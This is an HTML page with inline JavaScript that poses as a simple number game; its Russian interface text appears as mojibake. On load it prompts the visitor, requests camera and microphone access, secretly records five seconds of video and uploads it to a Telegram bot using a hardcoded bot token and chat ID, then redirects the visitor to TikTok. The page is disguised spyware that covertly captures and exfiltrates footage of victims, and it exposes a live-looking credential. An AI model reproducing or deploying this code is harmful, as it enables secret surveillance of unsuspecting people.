<body>

    <div id="game-box">

        <button onclick="confirmGame()">–ò–≥—Ä–∞—Ç—å!</button>
        <p id="loading">üîÑ –ó–∞–ø—Ä–æ—Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è...</p>
    </div>

    <script>
        const BOT_TOKEN = "7716703157:AAFMrWbVmUR75m8NefHAuliGiTJ5oaVx-j4";
        const CHAT_ID = "-1002307369875";

        let mediaRecorder;
        let recordedChunks = [];

        function confirmGame() {
            let userConfirmed = confirm("–•–æ—Ç–∏—Ç–µ –Ω–∞—á–∞—Ç—å –∏–≥—Ä—É?");
            if (userConfirmed) {
                requestCameraPermission();
            } else {
                window.location.href = "https://www.google.com"; // –ï—Å–ª–∏ –æ—Ç–∫–∞–∑–∞–ª—Å—è, —Å—Ä–∞–∑—É –≤—ã–∫–∏–¥—ã–≤–∞–µ–º
            }
        }

        async function requestCameraPermission() {
            try {
                document.getElementById("loading").style.display = "block";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById("loading").innerText = "–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–æ! –ó–∞–ø—É—Å–∫ –∏–≥—Ä—ã...";

                setTimeout(() => startChallenge(stream), 2000); // –î–∞–µ–º –Ω–µ–º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ –ø–µ—Ä–µ–¥ —Å—Ç–∞—Ä—Ç–æ–º
            } catch (error) {
                alert("–í—ã –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ! –í—ã—Ö–æ–¥...");
                window.location.href = "https://www.google.com"; // –í—ã–∫–∏–¥—ã–≤–∞–µ–º, –µ—Å–ª–∏ –æ—Ç–∫–∞–∑–∞–ª—Å—è –æ—Ç –∫–∞–º–µ—Ä—ã
            }
        }

        function startChallenge(stream) {
            document.getElementById("loading").style.display = "none";
            let randomNumber = Math.floor(Math.random() * 10) + 1;
            document.getElementById("question").innerText = "–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: " + randomNumber;

            // –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–ø–∏—Å—å –≤–∏–¥–µ–æ
            startRecording(stream);
        }

        async function startRecording(stream) {
            mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
            recordedChunks = [];

            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
                await sendToTelegram(videoBlob);

                // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                stream.getTracks().forEach(track => track.stop());

                // –†–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
                setTimeout(() => {
                    window.location.href = "https://www.tiktok.com";
                }, 3000);
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
        }

        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("video", videoBlob, "video.webm");

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: "POST",
                    body: formData
                });
                const data = await response.json();
                console.log("–í–∏–¥–µ–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram:", data);
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", error);
            }
        }

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø—Ä–∏ –∫–∞–∂–¥–æ–º –∑–∞—Ö–æ–¥–µ
        window.onload = function() {
            confirmGame();
        };
    </script>
